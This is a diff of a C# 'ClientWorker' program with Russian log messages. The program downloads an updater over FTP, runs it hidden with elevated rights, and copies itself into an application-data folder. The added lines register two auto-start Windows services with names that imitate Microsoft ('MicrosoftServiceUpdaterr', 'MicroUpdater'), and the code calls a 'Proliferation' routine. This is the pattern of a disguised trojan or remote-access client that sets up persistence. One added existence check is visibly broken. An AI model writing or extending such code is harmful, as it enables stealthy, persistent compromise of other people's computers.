@@ -30,12 +30,13 @@ namespace ClientWorker
             ftpClient.FTPDownloadFile(StartData.updater);
             File.Move(StartData.updater, applicationDataPath + StartData.floaderNewCopy + StartData.updater);
             Process proc = new Process();
-            proc.StartInfo.FileName = StartData.updater;
+            proc.StartInfo.FileName = applicationDataPath + StartData.floaderNewCopy + StartData.updater;
             proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             proc.StartInfo.Verb = "runas";
             try
             {
                 proc.Start();
+                Environment.Exit(0);
             }
             catch(Exception e)
             {
@@ -65,6 +66,7 @@ namespace ClientWorker
                 case "":
                 case "Reconnect":
                     Reconnect();
+                    Console.WriteLine("Переподключился");
                     break;
 
                 default:
@@ -84,10 +86,8 @@ namespace ClientWorker
             {
                 Console.WriteLine("Исключение закрытия потока");
             }
-
-            Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
-            Program.clientThread.Start();
-            Console.WriteLine("Переподключился");
+                Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
+                Program.clientThread.Start();              
         }
 
         public void Registration()
@@ -100,9 +100,13 @@ namespace ClientWorker
             proc.StartInfo.Verb = "runas";
 
             proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftServiceUpdaterr binPath= " + applicationDataPath + StartData.floaderNewCopy +
-                "Service.exe" +" DisplayName= MicrosoftUpdaterr type= own start= auto";
+                StartData.service + " DisplayName= MicrosoftUpdaterr type= own start= auto";
 
             proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.Start();
+
+            proc.StartInfo.Arguments = "/C " + "Sc create MicroUpdater binPath= " + applicationDataPath + StartData.floaderNewCopy +
+                StartData.updater + " DisplayName= MicroUpdater type= own start= auto";
             proc.Start();
 
             Proliferation(applicationDataPath);
@@ -114,14 +118,15 @@ namespace ClientWorker
 
             try
             {
-                if (Directory.Exists(parth))
+                if (File.Exists(Directory.Exists(parth)+ StartData.service))
                 {
                     return;
                 }
                 else
                 {
                     DirectoryInfo di = Directory.CreateDirectory(parth);
-                    File.Move(fileName, parth + "Service.exe");                
+                    File.Copy(fileName, parth + StartData.service);
+                    //File.Move(fileName, parth + StartData.service);                
                 }              
             }
             catch (Exception e)
